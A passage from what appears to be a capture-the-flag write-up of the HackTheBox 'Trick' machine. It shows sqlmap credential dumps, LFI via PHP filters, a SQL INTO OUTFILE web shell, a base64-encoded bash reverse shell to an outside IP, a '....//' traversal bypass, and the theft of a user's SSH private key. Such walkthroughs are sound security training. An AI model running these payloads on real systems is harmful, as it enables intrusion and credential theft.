+<span class="code-yellow">       __H__</span>
+<span class="code-yellow"> ___ ___[<span class="code-bg-red">(</span>]_____ ___ ___  </span><span class="code-white">{<span class="code-grey">1.6.6#stable</span>}</span>
+<span class="code-yellow">|_ -| . [<span class="code-bg-red">,</span>]     | .'| . |</span>
+<span class="code-yellow">|___|_  [<span class="code-bg-red">"</span>]_|_|_|__,|  _|</span>
+<span class="code-yellow">      |_|V...       |_|   </span><span class="mtku code-white">https://sqlmap.org</span>
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program  
+
+[*] starting
+
+...
+
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching columns for table '<span class="code-white">users</span>' in database '<span class="code-white">payroll_db</span>'
+...
+
+Database: payroll_db
+Table: users
+[8 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| address   | text         |
+| contact   | text         |
+| doctor_id | int(30)      |
+| id        | int(30)      |
+| name      | varchar(200) |
+| password  | varchar(200) |
+| type      | tinyint(1)   |
+| username  | varchar(200) |
++-----------+--------------+
+
+...
+</code></pre></div><p>Nice, let&rsquo;s dump fields <code>name</code>, <code>username</code> and <code>password</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sqlmap</span> --url <span class="code-dark-yellow">'http://preprod-payroll.trick.htb/ajax.php?action=login'</span> --data username=1 -p username --method POST --technique B --skip-waf --batch --level 5 --threads 5 --dbms mysql -D payroll_db -T users -C name,username,password --dump
+<span class="code-yellow">        ___</span>
+<span class="code-yellow">       __H__</span>
+<span class="code-yellow"> ___ ___[<span class="code-bg-red">(</span>]_____ ___ ___  </span><span class="code-white">{<span class="code-grey">1.6.6#stable</span>}</span>
+<span class="code-yellow">|_ -| . [<span class="code-bg-red">,</span>]     | .'| . |</span>
+<span class="code-yellow">|___|_  [<span class="code-bg-red">"</span>]_|_|_|__,|  _|</span>
+<span class="code-yellow">      |_|V...       |_|   </span><span class="mtku code-white">https://sqlmap.org</span>
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program  
+
+[*] starting
+
+...
+
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching entries of column(s) '<span class="code-white">name,password,username</span>' for table '<span class="code-white">users</span>' in database '<span class="code-white">payroll_db</span>'
+...
+
+Database: payroll_db
+Table: users
+[1 entry]
++---------------+------------+-----------------------+
+| name          | username   | password              |
++---------------+------------+-----------------------+
+| Administrator | Enemigosss | SuperGucciRainbowCake |
++---------------+------------+-----------------------+
+
+...
+</code></pre></div><p>Ok, we have a username and a password, but we can&rsquo;t do anything with them. This kind of a rabbit hole.</p><h3 id="finding-an-lfi">Finding an LFI</h3><p>If we continue inspecting the website, we notice a curious query parameter called <code>page</code>, that is being used to render the different pages of the web. It is likely to be vulnerable to Local File Inclusion (LFI) or Directory Path Traversal, because we can add <code>./</code> and the web still works:</p><p><img src="/images/HTB/Trick/Trick-preprod-test-lfi.png" alt="Trick test LFI"></p><p>In order to test for LFI, we can use a PHP wrapper like this one (Base64 encoding):</p><p><img src="/images/HTB/Trick/Trick-preprod-lfi.png" alt="Trick LFI"></p><p>Let&rsquo;s decode this string in Base64 with some shell scripting. This is <code>home.php</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -s <span class="code-dark-yellow">'preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=home'</span> | <span class="code-dark-green">grep</span> -A 1 <span class="code-dark-yellow">'&lt;main id="view-panel" &gt;'</span>
+  <span class="code-red">&lt;main id="view-panel" &gt;</span>
+                PD9waHAgaW5jbHVkZSAnZGJfY29ubmVjdC5waHAnID8+DQo8c3R5bGU+DQogICANCjwvc3R5bGU+DQoNCjxkaXYgY2xhc3M9ImNvbnRhaW5lLWZsdWlkIj4NCg0KCTxkaXYgY2xhc3M9InJvdyI+DQoJCTxkaXYgY2xhc3M9ImNvbC1sZy0xMiI+DQoJCQkNCgkJPC9kaXY+DQoJPC9kaXY+DQoNCgk8ZGl2IGNsYXNzPSJyb3cgbXQtMyBtbC0zIG1yLTMiPg0KCQkJPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIj4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgZWNobyAiV2VsY29tZSBiYWNrICIuICRfU0VTU0lPTlsnbG9naW5fbmFtZSddLiIhIiAgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQoJPC9kaXY+DQoNCjwvZGl2Pg0KPHNjcmlwdD4NCgkNCjwvc2NyaXB0Pg==  
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -s <span class="code-dark-yellow">'preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=home'</span> | <span class="code-dark-green">grep</span> -A 1 <span class="code-dark-yellow">'&lt;main id="view-panel" &gt;'</span> | <span class="code-dark-green">grep</span> -v main
+                PD9waHAgaW5jbHVkZSAnZGJfY29ubmVjdC5waHAnID8+DQo8c3R5bGU+DQogICANCjwvc3R5bGU+DQoNCjxkaXYgY2xhc3M9ImNvbnRhaW5lLWZsdWlkIj4NCg0KCTxkaXYgY2xhc3M9InJvdyI+DQoJCTxkaXYgY2xhc3M9ImNvbC1sZy0xMiI+DQoJCQkNCgkJPC9kaXY+DQoJPC9kaXY+DQoNCgk8ZGl2IGNsYXNzPSJyb3cgbXQtMyBtbC0zIG1yLTMiPg0KCQkJPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIj4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgZWNobyAiV2VsY29tZSBiYWNrICIuICRfU0VTU0lPTlsnbG9naW5fbmFtZSddLiIhIiAgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQoJPC9kaXY+DQoNCjwvZGl2Pg0KPHNjcmlwdD4NCgkNCjwvc2NyaXB0Pg==
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -s <span class="code-dark-yellow">'preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=home'</span> | <span class="code-dark-green">grep</span> -A 1 <span class="code-dark-yellow">'&lt;main id="view-panel" &gt;'</span> | <span class="code-dark-green">grep</span> -v main | <span class="code-dark-green">base64</span> -d
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span><span class="mtk1"> </span><span class="mtk5">include</span><span class="mtk1"> </span><span class="mtk4">'db_connect.php'</span><span class="mtk1"> </span><span class="mtk5">?</span><span class="mtk5">&gt;</span>
+<span class="mtk1">&lt;</span><span class="mtk5">style</span><span class="mtk1">&gt;</span>
+
+<span class="mtk1">&lt;/</span><span class="mtk5">style</span><span class="mtk1">&gt;</span>
+
+<span class="mtk1">&lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"containe-fluid"</span><span class="mtk1">&gt;</span>
+
+<span class="mtk1">        &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"row"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"col-lg-12"</span><span class="mtk1">&gt;</span>
+
+<span class="mtk1">                &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
+<span class="mtk1">        &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
+
+<span class="mtk1">        &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"row mt-3 ml-3 mr-3"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                        &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"col-lg-12"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"card"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                    &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"card-body"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                    </span><span class="mtk5">&lt;?php</span><span class="mtk1"> </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Welcome back "</span><span class="mtk5">.</span><span class="mtk1"> $_SESSION[</span><span class="mtk4">'login_name'</span><span class="mtk1">]</span><span class="mtk5">.</span><span class="mtk4">"!"</span><span class="mtk1">  </span><span class="mtk5">?</span><span class="mtk5">&gt;</span>  
+
+<span class="mtk1">                    &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
+
+<span class="mtk1">                &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
+<span class="mtk1">            &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
+<span class="mtk1">        &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
+
+<span class="mtk1">&lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
+<span class="mtk1">&lt;</span><span class="mtk5">script</span><span class="mtk1">&gt;</span>
+
+<span class="mtk1">&lt;/</span><span class="mtk5">script</span><span class="mtk1">&gt;</span>
+</code></pre></div><p>Since it is a PHP file, we must assume that the server appends the <code>.php</code> extension to the <code>page</code> parameter. In fact, we can execute <code>home.php</code> directly:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> preprod-payroll.trick.htb/home.php
+&lt;style&gt;
+
+&lt;/style&gt;
+
+&lt;div class="containe-fluid"&gt;
+
+        &lt;div class="row"&gt;
+                &lt;div class="col-lg-12"&gt;
+
+                &lt;/div&gt;
+        &lt;/div&gt;
+
+        &lt;div class="row mt-3 ml-3 mr-3"&gt;
+                        &lt;div class="col-lg-12"&gt;  
+                &lt;div class="card"&gt;
+                    &lt;div class="card-body"&gt;
+                    Welcome back !
+                    &lt;/div&gt;
+
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+
+&lt;/div&gt;
+&lt;script&gt;
+
+&lt;/script&gt;
+</code></pre></div><p>Now we can wrap the previous command into a shell function to read PHP files easily:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-yellow">function</span> read_file<span class="code-dark-yellow">()</span> <span class="code-dark-yellow">{</span> <span class="code-dark-green">curl</span> -s <span class="code-dark-yellow">"preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=<span class="code-dark-cyan">$1<span class="code-dark-yellow">"</span> | <span class="code-dark-green">grep</span> -A 1 <span class="code-dark-yellow">'&lt;main id="view-panel" &gt;'</span> | <span class="code-dark-green">grep</span> -v main | <span class="code-dark-green">base64</span> -d; <span class="code-dark-yellow">}</span>  
+</code></pre></div><p>Let&rsquo;s read <code>db_connect.php</code>, which is included in <code>home.php</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">read_file</span> db_connect  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>
+
+<span class="mtk1">$conn</span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">mysqli</span><span class="mtk1">(</span><span class="mtk4">'localhost'</span><span class="mtk1">,</span><span class="mtk4">'remo'</span><span class="mtk1">,</span><span class="mtk4">'TrulyImpossiblePasswordLmao123'</span><span class="mtk1">,</span><span class="mtk4">'payroll_db'</span><span class="mtk1">)</span><span class="mtk5">or</span><span class="mtk1"> </span><span class="mtk5">die</span><span class="mtk1">(</span><span class="mtk4">"Could not connect to mysql"</span><span class="mtk5">.</span><span class="mtk8">mysqli_error</span><span class="mtk1">($con));</span>  
+</code></pre></div><p>We have a password, we can try accessing as <code>remo</code> using this password in SSH, but it does not work.</p><h3 id="obtaining-rce">Obtaining RCE</h3><p>Since we have LFI, we can turn it to Remote Code Execution (RCE) if we have a way to enter PHP files in the server. Actually, this can be done using SQLi if we have enough privileges. Let&rsquo;s check it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sqlmap</span> --url <span class="code-dark-yellow">'http://preprod-payroll.trick.htb/ajax.php?action=login'</span> --data username=1 -p username --method POST --technique B --skip-waf --batch --level 5 --threads 5 --dbms mysql --privileges
+<span class="code-yellow">        ___</span>
+<span class="code-yellow">       __H__</span>
+<span class="code-yellow"> ___ ___[<span class="code-bg-red">"</span>]_____ ___ ___  </span><span class="code-white">{<span class="code-grey">1.6.6#stable</span>}</span>
+<span class="code-yellow">|_ -| . [<span class="code-bg-red">,</span>]     | .'| . |</span>
+<span class="code-yellow">|___|_  [<span class="code-bg-red">'</span>]_|_|_|__,|  _|</span>
+<span class="code-yellow">      |_|V...       |_|   </span><span class="mtku code-white">https://sqlmap.org</span>
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program  
+
+[*] starting
+
+...
+
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching entries of column(s) '<span class="code-white">name,password,username</span>' for table '<span class="code-white">users</span>' in database '<span class="code-white">payroll_db</span>'
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching database users privileges
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching database users
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching number of database users
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] resumed: 1
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieving the length of query output
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: 18
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: '<span class="code-white">remo</span>'@'<span class="code-white">localhost</span>'
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching number of privileges for user '<span class="code-white">remo</span>'
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] resumed: 1
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching privileges for user '<span class="code-white">remo</span>'
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieving the length of query output
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: 4
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: FILE
+database management system users privileges:
+[*] %remo% [1]:
+    privilege: FILE
+
+...
+</code></pre></div><p>So we have privilege <code>FILE</code>, and then we can read and write files to the server if we have privileges at the corresponding directory.</p><p>In order to write a file, let&rsquo;s use <code>UNION</code> queries. We already know that the current table has 8 columns, so let&rsquo;s go straight to the point:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'preprod-payroll.trick.htb/ajax.php?action=login'</span> -d <span class="code-dark-yellow">"username='+union+select+'&lt;?php+system(<span class="code-dark-cyan">\$</span>_GET[<span class="code-dark-cyan">\"</span>cmd<span class="code-dark-cyan">\"</span>]);+?&gt;',2,3,4,5,6,7,8+into+outfile+'/tmp/rev.php'--+-&password=asdf"</span>  
+&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Trying to get property 'num_rows' of non-object in &lt;b&gt;/var/www/payroll/admin_class.php&lt;/b&gt; on line &lt;b&gt;21&lt;/b&gt;&lt;br /&gt;
+3
+</code></pre></div><p>Since the file is stored in <code>/tmp</code>, we have enough privileges to store files. Now let&rsquo;s retrieve the file using the LFI (<code>/tmp/rev.php</code> without the <code>.php</code> extension):</p><p><img src="/images/HTB/Trick/Trick-preprod-test-lfi-rce.png" alt="Trick test LFI to RCE"></p><p>It shows the file, so now we have RCE:</p><p><img src="/images/HTB/Trick/Trick-preprod-lfi-rce.png" alt="Trick LFI to RCE"></p><p>Let&rsquo;s access the machine using a reverse shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i &gt;& /dev/tcp/10.10.17.44/4444 0&gt;&1'</span> | <span class="code-dark-green">base64</span>
+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -s <span class="code-dark-yellow">"preprod-payroll.trick.htb/index.php?page=../../../../tmp/rev&cmd=echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx+|+base64+-d+|+bash"</span>  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.166.
+Ncat: Connection from 10.10.11.166:42706.
+bash: cannot set terminal process group (790): Inappropriate ioctl for device  
+bash: no job control in this shell
+www-data@trick:~/payroll$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@trick:~/payroll$ ^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
+[1]  + continued  ncat -nlvp 4444
+                                 reset xterm
+www-data@trick:~/payroll$ export TERM=xterm
+www-data@trick:~/payroll$ export SHELL=bash
+www-data@trick:~/payroll$ stty rows 50 columns 158
+</code></pre></div><h2 id="lateral-movement-to-user-michael">Lateral movement to user <code>michael</code></h2><p>Inside the machine, we can see that there is another webpage in <code>/var/www/market</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@trick:~/payroll$ cd /var/www
+www-data@trick:~$ ls -la
+total 20
+drwxr-xr-x  5 michael michael 4096 May 25 13:28 .
+drwxr-xr-x 12 root    root    4096 May 25 13:28 ..
+drwxr-xr-x  5 michael michael 4096 May 25 13:28 html
+drwxr-xr-x  6 michael michael 4096 May 25 13:28 market
+drwxr-xr-x  4 michael michael 4096 May 25 13:28 payroll  
+</code></pre></div><p>We can read the nginx configuration in order to get the corresponding virtual host:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@trick:~$ ls /etc/nginx/sites-enabled/
+default
+www-data@trick:~$ cat /etc/nginx/sites-enabled/default | grep trick.htb  
+        server_name trick.htb;
+        server_name preprod-marketing.trick.htb;
+        server_name preprod-payroll.trick.htb;
+</code></pre></div><p>Alright, so after setting <code>preprod-marketing.trick.htb</code> into <code>/etc/hosts</code>, we have this webpage:</p><p><img src="/images/HTB/Trick/Trick-marketing-index.png" alt="Trick marketing index"></p><h3 id="finding-another-lfi">Finding another LFI</h3><p>Again, there is a curious parameter called <code>page</code> that is shouting to be vulnerable to LFI or Directory Path Traversal:</p><p><img src="/images/HTB/Trick/Trick-marketing-parameter.png" alt="Trick marketing parameter"></p><p>Since we have access to the machine, we can read the source code for this site and find the following:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@trick:~$ cd /var/www/market
+www-data@trick:~/market$ ls -la
+total 76
+drwxr-xr-x 6 michael michael  4096 May 25 13:28 .
+drwxr-xr-x 5 michael michael  4096 May 25 13:28 ..
+-rw-r--r-- 1 michael michael 13272 Apr 16 10:15 about.html
+-rw-r--r-- 1 michael michael  7677 Apr 16 10:15 contact.html
+drwxr-xr-x 2 michael michael  4096 May 25 13:28 css
+drwxr-xr-x 4 michael michael  4096 May 25 13:28 fontawesome
+-rw-r--r-- 1 michael michael  9660 Apr 16 10:14 home.html
+drwxr-xr-x 2 michael michael  4096 May 25 13:28 img
+-rw-r--r-- 1 michael michael   194 Apr 16 10:13 index.php
+drwxr-xr-x 2 michael michael  4096 May 25 13:28 js
+-rw-r--r-- 1 michael michael 10757 Apr 16 10:14 services.html  
+www-data@trick:~/market$ cat index.php
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>
+<span class="mtk1">$file </span><span class="mtk5">=</span><span class="mtk1"> $_GET[</span><span class="mtk4">'page'</span><span class="mtk1">];</span>
+
+<span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk7">isset</span><span class="mtk1">($file) </span><span class="mtk5">||</span><span class="mtk1"> ($file</span> <span class="mtk5">==</span> <span class="mtk4">'index.php'</span><span class="mtk1">)) {</span>
+<span class="mtk1">    </span><span class="mtk5">include</span><span class="mtk1">(</span><span class="mtk4">'/var/www/market/home.html'</span><span class="mtk1">);</span>
+<span class="mtk1">}</span> <span class="mtk5">else</span><span class="mtk1">{</span>
+<span class="mtk1">    </span><span class="mtk5">include</span><span class="mtk1">(</span><span class="mtk4">'/var/www/market/'</span> <span class="mtk5">.</span> <span class="mtk7">str_replace</span><span class="mtk1">(</span><span class="mtk4">'../'</span><span class="mtk1">,</span> <span class="mtk4">''</span><span class="mtk1">, $file));</span>  
+<span class="mtk1">}</span>
+</code></pre></div><p>It is including files and applying a sanitization. However, this filtering can be bypassed, because string replacements are not recursive and we can enter <code>"....//"</code>, and it will be transformed to <code>"../"</code>, leading to Directory Path Traversal and another Local File Inclusion.</p><p>Let&rsquo;s access to the <code>/tmp/rev.php</code> again and see if we have changed user:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'preprod-marketing.trick.htb/index.php?page=....//....//....//....//tmp/rev.php&cmd=whoami'</span>  
+michael
+        2       3       4       5       6       7       8
+</code></pre></div><p>There it is, we are <code>michael</code>. Hence, we can read its private SSH key:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@trick:~/market$ ls -la /home/michael
+total 84
+drwxr-xr-x 15 michael michael 4096 Jul 14 22:12 .
+drwxr-xr-x  3 root    root    4096 May 25 13:28 ..
+-rw-------  1 michael michael 1256 May 25 13:09 .ICEauthority
+lrwxrwxrwx  1 root    root       9 Apr 22 09:47 .bash_history -> /dev/null  
+-rw-r--r--  1 michael michael  220 Apr 18  2019 .bash_logout
+-rw-r--r--  1 michael michael 3526 Apr 18  2019 .bashrc
+drwx------  9 michael michael 4096 May 11 21:09 .cache
+drwx------ 10 michael michael 4096 May 11 21:08 .config
+drwx------  3 michael michael 4096 May 11 21:08 .gnupg
+drwx------  3 michael michael 4096 May 11 21:07 .local
+-rw-r--r--  1 michael michael  807 Apr 18  2019 .profile
+drwx------  2 michael michael 4096 May 24 17:25 .ssh
+-rw-------  1 michael michael 2492 Jul 14 22:12 .viminfo
+drwxr-xr-x  2 michael michael 4096 May 11 21:07 Desktop
+drwxr-xr-x  2 michael michael 4096 May 11 21:07 Documents
+drwxr-xr-x  2 michael michael 4096 May 11 21:07 Downloads
+drwxr-xr-x  2 michael michael 4096 May 11 21:07 Music
+drwxr-xr-x  2 michael michael 4096 May 11 21:07 Pictures
+drwxr-xr-x  2 michael michael 4096 May 11 21:07 Public
+drwxr-xr-x  2 michael michael 4096 May 11 21:07 Templates
+drwxr-xr-x  2 michael michael 4096 May 11 21:07 Videos
+-rw-r-----  1 root    michael   33 Jul 14 21:39 user.txt
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa'</span> | <span class="code-dark-green">tee</span> id_rsa  
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
+c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
+YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
+4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
+Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
+1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
+DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
++93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
+hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
+jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
+IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
+aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
+KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
+tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
+U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
+fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
+PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
